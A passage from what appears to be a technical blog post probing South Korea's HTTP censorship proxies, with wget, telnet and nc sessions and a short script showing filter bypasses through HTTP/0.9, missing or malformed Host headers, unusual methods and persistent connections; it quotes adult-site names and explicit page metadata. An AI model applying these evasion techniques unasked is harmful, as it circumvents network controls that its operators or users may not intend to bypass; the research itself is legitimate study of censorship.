<p><code>FTP.DE.FREEBSD.ORG</code> has other interesting ports, like rsync:</p>
<p>Sending http requests to open TCP ports (<code>873/tcp</code> [rsync] and <code>5666/tcp</code>) on <code>ftp.de.freebsd.org</code> with a censored Host will trigger the censorship too:</p>
<pre><code>user@kali:~$ wget --header="Host: www.xhamster.com" -O- http://ftp.de.freebsd.org:873/ 
--2016-10-01 XX:XX:XX--  http://ftp.de.freebsd.org:873/
Resolving ftp.de.freebsd.org (ftp.de.freebsd.org)... 213.83.42.56, 2a02:2e0:11:a00::10
Connecting to ftp.de.freebsd.org (ftp.de.freebsd.org)|213.83.42.56|:873... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: 'STDOUT'

-                                                        [&lt;=&gt;                                                                                                                   ]       0  --.-KB/s               &lt;html&gt;&lt;script&gt;
var arg = "http://warning.or.kr";
var str = new Array();
str = arg.split("&amp;", 1);
var a = new Array();
a = str[0].split("=");
var b = Math.floor(a[1] / 100);
var c = new Array();
if(b == 10){location.replace("http://www.naver.com");}
else if(b == 20){location.replace("http://www.daum.net");}
else if(b == 30){location.replace("http://www.paran.com");}
else{ c = a[0].split("?");
location.replace(c[0]);}
&lt;/script&gt;&lt;/html&gt;
-                                                        [ &lt;=&gt;                                                                                                                  ]     437  --.-KB/s    in 0s

2016-10-01 XX:XX:XX (43.1 MB/s) - written to stdout [437]


user@kali:~$ wget --header="Host: www.xhamster.com" -O- http://ftp.de.freebsd.org:5666/
--2016-10-01 XX:XX:XX--  http://ftp.de.freebsd.org:5666/
Resolving ftp.de.freebsd.org (ftp.de.freebsd.org)... 213.83.42.56, 2a02:2e0:11:a00::10
Connecting to ftp.de.freebsd.org (ftp.de.freebsd.org)|213.83.42.56|:5666... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: 'STDOUT'

-                                                        [&lt;=&gt;                                                                                                                   ]       0  --.-KB/s               &lt;html&gt;&lt;script&gt;
var arg = "http://warning.or.kr";
var str = new Array();
str = arg.split("&amp;", 1);
var a = new Array();
a = str[0].split("=");
var b = Math.floor(a[1] / 100);
var c = new Array();
if(b == 10){location.replace("http://www.naver.com");}
else if(b == 20){location.replace("http://www.daum.net");}
else if(b == 30){location.replace("http://www.paran.com");}
else{ c = a[0].split("?");
location.replace(c[0]);}
&lt;/script&gt;&lt;/html&gt;
-                                                        [ &lt;=&gt;                                                                                                                  ]     437  --.-KB/s    in 0s

2016-10-01 XX:XX:XX (35.3 MB/s) - written to stdout [437]

user@kali:~$
</code></pre>
<p><strong>Analysis: the censorship system is a transparent proxy located in hop 10 or 11, located in the edge of Korean network to listen to international links.</strong></p>
<p><strong>The censorship system only targets HTTP identified connections within ALL TCP connections passing in the international links of South Korea.</strong></p>
<p><strong>The local traffic inside the country is not filtered.</strong></p>
<p><a id="inner-work-of-the-censorship-system"></a></p>
<h2>3. Inner work of the censorship system</h2>
<p><a id="different-answers-provided-by-censorship-systems"></a></p>
<h3>3.1 Different answers provided by the censorship system</h3>
<p>In the previous section, I illustrated how the censorship system analyses all the HTTP packets looking for the host of the remote website. You can contact a legit remote HTTP server and change the Host Field to trigger the censorship as long as you cross international fiber optic.</p>
<p>The censorship system is working with different proxy clusters, providing different answers. That is, depending on the transparent proxy you are using, you get different behaviors. You have no control about the transparent proxies you are using.</p>
<p>In this section, I would like to introduce different behaviors of the censorship that you will face when you visit a banned website in the SKT, KT and LG networks. </p>
<p><a id="direct-html-as-an-answer"></a></p>
<h4>1) Direct HTML as an answer</h4>
<p>This answer seems to be used for a cache proxy.</p>
<p>When trying to contact a website for the first time, if the remote transparent proxy doesn't reply yet to a browser, it will reply this webpage:</p>
<pre><code>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd"&gt;
&lt;!-- &lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
"http://www.w3.org/TR/html4/strict.dtd"&gt; --&gt;
&lt;HTML&gt;
&lt;HEAD&gt;
&lt;META HTTP-EQUIV="Refresh" CONTENT="0.1"&gt;
&lt;META HTTP-EQUIV="Pragma" CONTENT="no-cache"&gt;
&lt;META HTTP-EQUIV="Expires" CONTENT="-1"&gt;
&lt;TITLE&gt;&lt;/TITLE&gt;
&lt;/HEAD&gt;
&lt;BODY&gt;&lt;P&gt;&lt;/BODY&gt;
&lt;/HTML&gt;
</code></pre>
<p>Your browser will ask a refresh within 0.1 second of the URI, which will provide a new HTTP answer (see the next two answers):</p>
<p><a id="direct-html-as-an-answer-system-a"></a></p>
<h4>2) Direct HTML as an answer (censorship system A)</h4>
<p>Contacting a Google server at <code>216.58.214.131</code> (not hosted in South Korea), asking for a censored website:</p>
<pre><code>user@kali:~$ wget -O- --header="Host: www.xhamster.com" http://www.google.ru/
--2016-10-01XX:XX:XX--  http://www.google.ru/
Resolving www.google.ru (www.google.ru)... 216.58.214.131, 2a00:1450:4001:813::2003
Connecting to www.google.ru (www.google.ru)|216.58.214.131|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: 'STDOUT'

&lt;html&gt;&lt;script&gt;
var arg = "http://www.warning.or.kr"
var str = new Array();
str = arg.split("&amp;", 1);
var a = new Array();
a = str[0].split("=")
var b = Math.floor(a[1] / 100);
var c = new Array();
if(b == 10){location.replace("http://www.google.com");}
else{
c = a[0].split("?");
location.replace(c[0]);
}
&lt;/script&gt;&lt;/html&gt;

2016-10-01XX:XX:XX (12.5 MB/s) - written to stdout [330]
user@kali:~$
</code></pre>
<p>The answer is:</p>
<pre><code>HTTP/1.0 200 OK
Content-type: text/html

&lt;html&gt;&lt;script&gt;
var arg = "http://www.warning.or.kr"
var str = new Array();
str = arg.split("&amp;", 1);
var a = new Array();
a = str[0].split("=")
var b = Math.floor(a[1] / 100);
var c = new Array();
if(b == 10){location.replace("http://www.google.com");}
else{
c = a[0].split("?");
location.replace(c[0]);
    }
&lt;/script&gt;&lt;/html&gt;
</code></pre>
<p>The JavaScript code may differ depending on the used ISP (i.e.: KT):</p>
<pre><code>HTTP/1.0 200 OK
Content-type: text/html

&lt;html&gt;&lt;script&gt;
var arg = "http://warning.or.kr";
var str = new Array();
str = arg.split("&amp;", 1);
var a = new Array();
a = str[0].split("=");
var b = Math.floor(a[1] / 100);
var c = new Array();
if(b == 10){location.replace("http://www.naver.com");}
else if(b == 20){location.replace("http://www.daum.net");}
else if(b == 30){location.replace("http://www.paran.com");}
else{ c = a[0].split("?");
location.replace(c[0]);}
&lt;/script&gt;&lt;/html&gt;
</code></pre>
<p>You will note the censorship system is banning my request even if I try to contact a remote server from Google that doesn't host a censored website.</p>
<p><a id="direct-html-as-an-answer-system-b"></a></p>
<h4>3) 302 Temporary redirect (censorship system B)</h4>
<p>By contacting Google servers located in US and asking a banned vhost, the webpage will show a 302 redirection to <code>http://www.warning.or.kr/</code>:</p>
<p>This one is a 302 temporary redirect:</p>
<pre><code>user@kali:~$ wget -O- --header="Host: www.xhamster.com" http://www.google.ru/
--2016-10-01XX:XX:XX--  http://www.google.ru/
Resolving www.google.ru (www.google.ru)... 216.58.214.131, 2a00:1450:4001:813::2003
Connecting to www.google.ru (www.google.ru)|216.58.214.131|:80... connected.
HTTP request sent, awaiting response... 302 Redirect
Location: http://www.warning.or.kr [following]
--2016-10-01 XX:XX:XX--  http://www.warning.or.kr/
Resolving www.warning.or.kr (www.warning.or.kr)... 121.189.57.82
Connecting to www.warning.or.kr (www.warning.or.kr)|121.189.57.82|:80...connected.
HTTP request sent, awaiting response... 200 OK
Length: 10590 (10K) [text/html]
Saving to: 'STDOUT'

&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8"&gt;
&lt;meta name="kcsc" content="blocking" /&gt;
&lt;title&gt;www.warning.or.kr&lt;/title&gt;
&lt;style type="text/css"&gt;
[...]
</code></pre>
<p>The answer is:</p>
<pre><code>HTTP/1.0 302 Redirect
Location: http://www.warning.or.kr
</code></pre>
<p><a id="brief-analysis"></a></p>
<h3>3.2 Brief analysis</h3>
<p>In short, load-balanced transparent proxies are located somewhere in South Korea and are analyzing the <code>Host</code> header in the HTTP request (or in the URIs if you are using HTTP/0.9 or HTTP/1.0 - we will see that in the next section). These are:</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp; 1/ If the vhost is not blacklisted, forwarding the request to the remote server.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;OR</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;2/ If the vhost is blacklisted,</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i) Blocking and providing a HTML webpage asking for a refresh so that a cached webpage will be created and provided to the client.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;AND</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ii) Blocking and providing a 302 HTTP response to the client. The client will follow the 302 response to http://www.warning.or.kr/.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OR</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;iii) Blocking and providing a webpage witha JavaScript redirection to http://www.warning.or.kr/. The client will be directed to the http://www.warning.or.kr/ webpage.</p>
<p>This will open discussion about HTTP/2, HTTPS, and exotic protocol (websockets). Let's not forget IPv6 as a network layer (this is important) but before, we will speak about the future: HTTP/0.9 and HTTP/1.0.</p>
<p>OK, let's go browsing censored websites, with more potential options (HTTPS, HTTP/* support...) that will allow us to determine how the censorship works.</p>
<p><a id="from-http-0.9-to-http-1.1"></a></p>
<h3>3.3 Let's debug the censorship system - From HTTP/0.9 to HTTP/1.1</h3>
<p>Forging HTTP request manually will show us what is happening in the application layer. No more use of fake HTTP Google servers. Let's try to contact remote censored websites!</p>
<p><a id="http-0.9"></a></p>
<h4>3.3.1 HTTP/0.9</h4>
<p>Firstly, playing with HTTP/0.9:</p>
<pre><code>user@kali:~$ telnet xhamster.com 80
Trying 88.208.18.30...
Connected to xhamster.com.
Escape character is '^]'.
GET /

&lt;!doctype html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
&lt;meta charset="utf-8"&gt;&lt;meta name="referrer" content="always" /&gt;
&lt;title&gt;Free Porn Videos &amp; HD Sex Tube Movies at xHamster&lt;/title&gt;
&lt;meta name="description" content="Watch and download all Porn Videos at xHamster for Free, including HD. Browse sex photos, date girls to fuck &amp;amp; have fun in Live Sex Chat only at xHamster!"&gt;
&lt;meta name="RATING" content="RTA-5042-1996-1400-1577-RTA"&gt;
&lt;meta name="viewport" content=""&gt;
&lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt;
&lt;meta name="yandex-tableau-widget" content="logo=http://static-ec.xhcdn.com/images/xYa.png, color=#f2f2f2" /&gt;
&lt;link rel="alternate" href="http://xhamster.com/" hreflang="x-default"&gt;
&lt;link rel="alternate" href="http://xhamster.com/" hreflang="en"&gt;
&lt;link rel="alternate" href="http://ru.xhamster.com/" hreflang="ru"&gt;
&lt;link rel="alternate" href="http://de.xhamster.com/" hreflang="de"&gt;
[...]
</code></pre>
<p>Success! The banned website can now be visited using the bleeding-edge HTTP/0.9 technology.</p>
<p>It's useless as visiting websites using only HTTP/0.9 will result in a lot of broken resources (no vhost support, good luck).</p>
<p><a id="http-1.0"></a></p>
<h4>3.3.2 HTTP/1.0</h4>
<p>Ok let's play with HTTP/1.0 where the <code>Host</code> header is still not mandatory if we read the <a href="https://tools.ietf.org/html/rfc1945">RFC1945 - Hypertext Transfer Protocol -- HTTP/1.0</a>:</p>
<p>With SKT and KT, you will receive the uncensored webpage:</p>
<pre><code>user@kali:~$ telnet www.xhamster.com 80
Trying 88.208.29.24...
Connected to www.xhamster.com.
Escape character is '^]'.
GET / HTTP/1.0

HTTP/1.1 200 OK
Server: nginx/1.10.1
Date: Fri, 01 Oct 2016 00:00:00 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Vary: Accept-Encoding
X-Powered-By: PHP/7.0.5
Set-Cookie: stats_id=000000; expires=Wed, XX-Oct-2016 00:00:00 GMT; Max-Age=604800; path=/; domain=.xhamster.com
Srv: m43
Set-Cookie: first_visit=0000000000; expires=Thu, XX-Oct-2017 00:00:00 GMT; Max-Age=31536000; path=/; domain=.xhamster.com
Set-Cookie: prid=--; expires=Thu, 01-Oct-2016 00:00:00 GMT; Max-Age=86400; path=/; domain=.xhamster.com
Set-Cookie: prs=--; expires=Thu, 01-Oct-2016 00:00:00 GMT; Max-Age=86400; path=/; domain=.xhamster.com

&lt;!doctype html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
&lt;meta charset="utf-8"&gt;&lt;meta name="referrer" content="always" /&gt;
&lt;title&gt;Free Porn Videos &amp; HD Sex Tube Movies at xHamster&lt;/title&gt;
&lt;meta name="description" content="Watch and download all Porn Videos at xHamster for Free, including HD. Browse sex photos, date girls to fuck &amp;amp; have fun in Live Sex Chat only at xHamster!"&gt;
&lt;meta name="RATING" content="RTA-5042-1996-1400-1577-RTA"&gt;
&lt;meta name="viewport" content=""&gt;
&lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt;
&lt;meta name="yandex-tableau-widget" content="logo=http://static-ec.xhcdn.com/images/xYa.png, color=#f2f2f2" /&gt;
&lt;link rel="alternate" href="http://xhamster.com/" hreflang="x-default"&gt;
[...]
</code></pre>
<p>It works on this censored website, too. Having an old browser without <code>Host</code> support will bypass the censorship (as long as the remote website is serving webpages without providing <code>Host</code> - it depends on the remote configuration of the remote servers).
But good luck browsing the Internet without having vhost support :)</p>
<p>Note that this technique doesn't work with a LG U+ connection:</p>
<pre><code>user@kali:~$ telnet www.xhamster.com 80
Trying 88.208.29.24...
Connected to www.xhamster.com.
Escape character is '^]'.
GET / HTTP/1.0

HTTP/1.0 302 Redirect
Location: http://www.warning.or.kr/
</code></pre>
<p>However, if you contact an uncensored website without proving a <code>Host</code> field, the webpage will not be blocked in a LG U+ connection.</p>
<p><strong>It means that LG has apparently a database of IPs corresponding of censored websites and if you contact them without providing a Host, the request will be blocked.</strong></p>
<p>Now still with HTTP/1.0:</p>
<pre><code>user@kali:~$ telnet xhamster.com 80
Trying 88.208.18.30...
Connected to xhamster.com.
Escape character is '^]'.
GET http://www.xhamster.com/ HTTP/1.0
HTTP/1.0 302 Redirect
Location: http://www.warning.or.kr

Connection closed by foreign host.
user@kali:~$
</code></pre>
<p><strong>Wow, this request was banned even with HTTP/1.0. From this, we can determine the transparent proxies are analyzing the URI too (along with the Host field), looking for forbidden domains.</strong></p>
<p><a id="http-1.1"></a></p>
<h4>3.3.3 HTTP/1.1</h4>
<p>Now we start playing with Host using the "new" HTTP/1.1 technology (RFC 2616, only 17 year old):</p>
<p>The <code>Host</code> field containing a censored webpage will trigger the censorship system:</p>
<pre><code>user@kali:~$ telnet www.xhamster.com 80
Trying 88.208.29.24...
Connected to www.xhamster.com.
Escape character is '^]'.
GET / HTTP/1.0
Host: xhamster.com
HTTP/1.0 302 Redirect
Location: http://www.warning.or.kr

Connection closed by foreign host.
user@kali:~$
</code></pre>
<p>This request is banned.</p>
<p>The invalid Host <code>www.xhamster.com/aaaaaaaafield</code> containing a censored webpage will trigger the censorship system too:</p>
<pre><code>user@kali:~$ telnet www.xhamster.com 80
Trying 88.208.18.30...
Connected to www.xhamster.com.
Escape character is '^]'.
GET / HTTP/1.0
Host: www.xhamster.com/aaaaaaaa
HTTP/1.0 302 Redirect
Location: http://www.warning.or.kr

Connection closed by foreign host.
user@kali:~$
</code></pre>
<p>This request is banned even if the vhost is not good.</p>
<p>The Host <code>www.xhamster.com:80</code> field containing a censored webpage will trigger the censorship system:</p>
<pre><code>user@kali:~$ telnet www.xhamster.com 80
Trying 88.208.29.24...
Connected to www.xhamster.com.
Escape character is '^]'.
GET / HTTP/1.0
Host: www.xhamster.com:80
HTTP/1.0 302 Redirect
Location: http://www.warning.or.kr

Connection closed by foreign host.
user@kali:~$
</code></pre>
<p>The request is still banned with <code>www.xhamster.com:80</code> as a remote host.</p>
<p>The Host <code>www.xhamster.com:-800000000000000000000</code> field containing a censored webpage will trigger the censorship system too:</p>
<pre><code>user@kali:~$telnet www.xhamster.com 80
Trying 88.208.18.30...
Connected to www.xhamster.com.
Escape character is '^]'.
GET / HTTP/1.0
Host: www.xhamster.com:-800000000000000000000
HTTP/1.0 302 Redirect
Location: http://www.warning.or.kr

Connection closed by foreign host.
user@kali:~$
</code></pre>
<p>So <code>www.xhamster.com:-800000000000000000000</code> is banned too.</p>
<p>The Host <code>www.xhamster.com:80:80</code> field containing a censored webpage will trigger the censorship system:</p>
<pre><code>user@kali:~$ telnet www.xhamster.com 80
Trying 88.208.29.24...
Connected to www.xhamster.com.
Escape character is '^]'.
GET / HTTP/1.0
Host: www.xhamster.com:80:80

HTTP/1.0 302 Redirect
Location: http://www.warning.or.kr

Connection closed by foreign host.
user@kali:~$
</code></pre>
<p><code>www.xhamster.com:80:80</code> is banned too.</p>
<p>Sending 2 hosts with the first one in the list of censored websites trigger the censorship system:</p>
<pre><code>user@kali:~$ telnet www.xhamster.com 80
Trying 88.208.29.24...
Connected to www.xhamster.com.
Escape character is '^]'.
GET / HTTP/1.0
Host: www.xhamster.com
Host: www.lulz.com

HTTP/1.0 302 Redirect
Location: http://www.warning.or.kr

Connection closed by foreign host.
user@kali:~$
</code></pre>
<p>With 2 <code>Host</code> fields, only the first one seems to be used. Sending 2 hosts with only the second one in the list of censored websites will NOT trigger the censorship system as I received an answer from Xhamster.com servers:</p>
<pre><code>user@kali:~$ telnet www.xhamster.com 80
Trying 88.208.29.24...
Connected to www.xhamster.com.
Escape character is '^]'.
GET / HTTP/1.0
Host: www.lulz.com
Host: www.xhamster.com

HTTP/1.1 301 Moved Permanently
Server: nginx/1.10.1
Date: Fri, 01Oct 2016 00:00:00 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.0.5
Location: http://lulz.com/

Connection closed by foreign host.
user@kali:~$
</code></pre>
<p>With 2 <code>Host</code> fields, the first one is used and this request was OK but unusable because the remote server is configured to use the first vhost and is providing me with a 301 redirection to it (protip xhamster admins: please use a catch-all vhost!).</p>
<p>Ok, as seen already, the system is analyzing HTTP requests passing to every international link. Let's continue using Google servers :)</p>
<p>Asking <code>www.xhamster.com</code> to a Google server will result in a 302 redirect to <code>http://www.warning.or.kr</code>:</p>
<pre><code>user@kali:~$ telnet 216.58.197.227 80
Trying 216.58.197.227...
Connected to 216.58.197.227.
Escape character is '^]'.
GET / HTTP/1.0
Host: www.xhamster.com
HTTP/1.0 302 Redirect
Location: http://www.warning.or.kr

Connection closed by foreign host.
user@kali:~$
</code></pre>
<p>Asking <code>www.xhamster.com%00</code> will produce an error from the Google server, showing that the request was NOT censored!</p>
<pre><code>user@kali:~$ telnet 216.58.197.227 80
Trying 216.58.197.227...
Connected to 216.58.197.227.
Escape character is '^]'.
GET / HTTP/1.0
Host: www.xhamster.com%00

HTTP/1.0 400 Bad Request
Content-Length: 54
Content-Type: text/html; charset=UTF-8
Date: Fri, 01 Oct 2016 00:00:00 GMT

&lt;html&gt;&lt;title&gt;Error 400 (Bad Request)!!1&lt;/title&gt;&lt;/html&gt;Connection closed by foreign host.
user@kali:~$
</code></pre>
<p>Ok, let's try on <code>Xhamster.com</code> website:</p>
<pre><code>user@kali:~$ telnet xhamster.com 80  
Trying 88.208.29.24...
Connected to xhamster.com.
Escape character is '^]'.
GET / HTTP/1.0
Host: www.xhamster.com%00

HTTP/1.1 301 Moved Permanently
Server: nginx/1.10.1
Date: Fri, 01 Oct 2016 00:00:00 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.0.5
Location: http://xhamster.com%00/

Connection closed by foreign host.
user@kali:~$
</code></pre>
<p>It works - I got a reply from the www.xhamster.com server.</p>
<p>Let's try to add some random stuff with invalid HTTP request (e.g. Host: <code>%s:www.xhamster.com</code>):</p>
<pre><code>user@kali:~$ telnet xhamster.com 80
Trying 88.208.18.30...
Connected to xhamster.com.
Escape character is '^]'.
GET / HTTP/1.0
Host: %s:www.xhamster.com

HTTP/1.1 301 Moved Permanently
Server: nginx/1.10.1
Date: Fri, 01Oct 2016 00:00:00 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.0.5
Location: http://xhamster.com/

Connection closed by foreign host.
user@kali:~$
</code></pre>
<p>It works too!</p>
<p>Ok, doing Webdav will work too. The remote Xhamster.com webpage will reply to me:</p>
<pre><code>user@kali:~$ telnet xhamster.com 80   
Trying 88.208.29.24...
Connected to xhamster.com.
Escape character is '^]'.
OPTIONS * HTTP/1.1
Host: www.xhamster.com:80

HTTP/1.1 400 Bad Request
Server: nginx/1.10.1
Date: Fri, 01 Oct 2016 00:00:00 GMT
Content-Type: text/html
Content-Length: 173
Connection: close

&lt;html&gt;
&lt;head&gt;&lt;title&gt;400 Bad Request&lt;/title&gt;&lt;/head&gt;
&lt;body bgcolor="white"&gt;
&lt;center&gt;&lt;h1&gt;400 Bad Request&lt;/h1&gt;&lt;/center&gt;
&lt;hr&gt;&lt;center&gt;nginx/1.10.1&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
Connection closed by foreign host.
user@kali:~$
</code></pre>
<p>Using URIs will trigger the censorship system too:</p>
<p>Fetching <code>http://xhamster.com/about.php</code> and <code>http://www.xhamster.com/</code> will show a 302 redirect to <code>http://www.warning.or.kr</code>:</p>
<pre><code>user@kali:~$ telnet xhamster.com 80
Trying 88.208.29.24...
Connected to xhamster.com.
Escape character is '^]'.
GET http://xhamster.com/about.php HTTP/1.1
HTTP/1.0 302 Redirect
Location: http://www.warning.or.kr

Connection closed by foreign host.
user@kali:~$
</code></pre>
<p>In this one, I ask <code>http://www.xhamster.com/</code> to a remote Google server (censored too):</p>
<pre><code>user@kali:~$ telnet 216.58.214.131 80
Trying 216.58.214.131...
Connected to 216.58.214.131.
Escape character is '^]'.
GET http://www.xhamster.com/ HTTP/1.0
HTTP/1.0 302 Redirect
Location: http://www.warning.or.kr

Connection closed by foreign host.
user@kali:~$
</code></pre>
<p>And minutes later, the same request will send me another reply:</p>
<pre><code>user@kali:~$ telnet google.ru 80
Trying 216.58.214.131...
Connected to google.ru.
Escape character is '^]'.
GET http://www.xhamster.com/ HTTP/1.0
HTTP/1.0 200 OK
Content-type: text/html

&lt;html&gt;&lt;script&gt;
var arg = "http://www.warning.or.kr"
var str = new Array();
str = arg.split("&amp;", 1);
var a = new Array();
a = str[0].split("=")
var b = Math.floor(a[1] / 100);
var c = new Array();
if(b == 10){location.replace("http://www.google.com");}
else{
c = a[0].split("?");
location.replace(c[0]);
}
&lt;/script&gt;&lt;/html&gt;
Connection closed by foreign host.
user@kali:~$
</code></pre>
<p><a id="analysis"></a></p>
<h3>3.4 Analysis</h3>
<p>The censorship system analyzes <code>URI</code> and <code>Host</code> field to identify remote webserver and denies the access by providing a 302 redirection to <code>www.warning.co.kr</code> or by providing a webpage with a JavaScript redirection.</p>
<p>HTTP/0.9 is not supported and bypasses the censorship system.</p>
<p>HTTP/1.0 and HTTP/1.1 requests without Hosts or complete URI are not supported and thus bypass the censorship system by default.</p>
<p>We have now questions:</p>
<ul>
<li>Will using HTTPS bypass the transparent proxy?</li>
<li>Will using HTTP/2 with TLS bypass the transparent proxy?</li>
<li>How about IPv6?</li>
</ul>
<p><a id="more-tricky-requests-with-http"></a></p>
<h3>3.5 More tricky requests with HTTP</h3>
<p><a id="custom-vhosts"></a></p>
<h4>3.5.1 Custom Vhosts</h4>
<p>I was lucky to find a website with a wildcard for the vhost: <code>Tube8.com</code> (NSFW - thank you tube8.com admins).</p>
<p>Using random vhosts while contacting the <code>Tube8.com</code> servers will still provide me with <code>tube8.com</code> webpages.</p>
<p>As shown below, <code>Tube8.com</code> is configured as a wildcard, and requesting this webpage with a custom vhost (<code>please-enlarge-my-bandwith</code>) will work:</p>
<pre><code>user@kali:~$ telnet tube8.com 80
Trying 31.192.112.104...
Connected to tube8.com.
Escape character is '^]'.
GET / HTTP/1.0
Host: please-enlarge-my-bandwith

HTTP/1.1 200 OK
Server: nginx
Date: Fri, 01 Oct 2016 00:00:00 GMT
Content-Type: text/html
Connection: close
Set-Cookie: t8segm=0; expires=Wed, 01-Oct-2016 00:00:00 GMT; Max-Age=604800; path=/
Set-Cookie: rand1=1472020135; expires=Wed, 01-Oct-2016 00:00:00 GMT; Max-Age=3600; path=/; domain=tube8.com
Set-Cookie: rand2=REMOVED; expires=Wed, 01-Oct-2016 00:00:00 GMT; Max-Age=3600; path=/; domain=tube8.com
Set-Cookie: GA-BE-SID=REMOVED
Vary: User-Agent, Accept-Encoding
Rating: RTA-5042-1996-1400-1577-RTA
Set-Cookie: RNLBSERVERID=ded1772; path=/

&lt;!DOCTYPE html&gt;
        &lt;html class="en" lang="en" id="lang_en"&gt;
        &lt;head&gt;
        &lt;script type="text/javascript"&gt;
            var rta = document.createElement('script');
            rta.type = 'text/javascript';


[will send the complete index.html webpage]
</code></pre>
<p>Trying to <code>wget</code> the webpage (with <code>tube8.com</code> vhost) will forward to the <code>www.warning.or.kr</code> webpage, ruining all the fun:</p>
<pre><code>user@kali:~$  wget http://www.tube8.com/
--2016-10-01 XX:XX:XX--  http://www.tube8.com/
Resolving www.tube8.com (www.tube8.com)... 31.192.112.104
Connecting to www.tube8.com (www.tube8.com)|31.192.112.104|:80... connected.
HTTP request sent, awaiting response... 302 Redirect
Location: http://www.warning.or.kr [following]
--2016-10-01 XX:XX:XX--  http://www.warning.or.kr/
Resolving www.warning.or.kr (www.warning.or.kr)... 121.189.57.82
Connecting to www.warning.or.kr (www.warning.or.kr)|121.189.57.82|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10590 (10K) [text/html]
Saving to: 'index.html.1'

index.html.1100%[=====================================================================================================================&gt;]  10.34K  --.-KB/s    in 0.02s

2016-10-01 XX:XX:XX (628 KB/s) - 'index.html.1' saved [10590/10590]

user@kali:~$
</code></pre>
<p>Now by setting a custom vhost (<code>please-enlarge-my-bandwith.com</code>), we will bypass the censorship!</p>
<pre><code>user@kali:~$ wget --header="Host: please-enlarge-my-bandwith.com" -O- http://www.tube8.com/      
--2016-10-01 XX:XX:XX--  http://www.tube8.com/
Resolving www.tube8.com (www.tube8.com)... 31.192.112.104
Connecting to www.tube8.com (www.tube8.com)|31.192.112.104|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: 'STDOUT'

&lt;!DOCTYPE html&gt;
&lt;html class="en" lang="en" id="lang_en"&gt;
&lt;head&gt;
&lt;script type="text/javascript"&gt;
var rta = document.createElement('script');
rta.type = 'text/javascript';

[...]
</code></pre>
<p>Censorship was bypassed and confirms the filtering occurs in the <code>Host</code> header if we are using HTTP/1.1.</p>
<p><a id="http-requests-methods"></a></p>
<h4>3.5.2 HTTP requests methods</h4>
<p>Introducing a new banned website: <code>www.spankwire.com</code>.</p>
<p>This website is censored.</p>
<p>The reader will note that we only did <code>GET</code> requests in the previous sections. Now, from my tests, only <code>GET</code> and <code>POST</code> are filtered:</p>
<p>These requests will be censored:</p>
<p><code>GET</code> request with a <code>Host</code> header:</p>
<pre><code>user@kali:~$ (echo GET / HTTP/1.0
echo Host: www.spankwire.com
echo ) | nc www.spankwire.com 80

HTTP/1.0 302 Redirect
Location: http://www.warning.or.kr
</code></pre>
<p><code>GET</code> request with a complete URI containing a censored website:</p>
<pre><code>user@kali:~$ (echo GET http://www.spankwire.com/ HTTP/1.0
echo ) | nc www.spankwire.com 80

HTTP/1.0 302 Redirect
Location: http://www.warning.or.kr
</code></pre>
<p><code>POST</code> requests are censored too.</p>
<p>Fun facts: <code>X</code> <code>RANDOM</code> <code>PUT</code> <code>DELETE</code> <code>OPTIONS</code> <code>TRACE</code> <code>CONNECT</code> methods are NOT censored.</p>
<p>A <code>X</code> method and a <code>RANDOM</code> method can work against Apache2 servers.</p>
<p><code>X / HTTP/1.0</code> will provide us with a remote resource, being treated as <code>GET / HTTP/1.0</code> by Apache.</p>
<p>Nginx doesn't like random HTTP methods.</p>
<p>This can be used to bypass the censorship system as only <code>GET</code> and <code>POST</code> requests are analyzed.</p>
<p><a id="having-fun-with-http-1.1-persistent-connection"></a></p>
<h4>3.5.3 Having fun with HTTP/1.1 persistent connection</h4>
<p>You can send requests to multiple resources within a TCP connection for a HTTP/1.1 connection. Let's use it to find a "race condition" :)</p>
<pre><code>user@kali:~$ cat tcp-http11-persistent-test0.sh
#!/bin/sh

(
# first request, asking information about /
echo 'HEAD / HTTP/1.1'
echo

sleep 0.3 # will bypass the block


# second request, getting /
echo 'GET / HTTP/1.1'
echo 'Host: www.tube8.com'
echo
) | nc www.tube8.com 80

user@kali:~$
</code></pre>
<p>Surprisingly, this request will bypass the censorship:</p>
<pre><code>user@kali:~$ sh tcp-http11-persistent-test0.sh
HTTP/1.1 301 Moved Permanently
Server: nginx
Date: Fri, 01 Oct 2016 00:00:00 GMT
Content-Type: text/html
Content-Length: 178
Location: http://www.tube8.com/400.html
Vary: User-Agent, Accept-Encoding
Rating: RTA-5042-1996-1400-1577-RTA
Set-Cookie: RNLBSERVERID=ded1165; path=/

HTTP/1.1 200 OK
Server: nginx
Date: Fri, 01 Oct 2016 00:00:00 GMT
Content-Type: text/html
Transfer-Encoding: chunked
Set-Cookie: t8segm=0; expires=Fri, 01-Oct-2017 00:00:00 GMT; Max-Age=604800; path=/
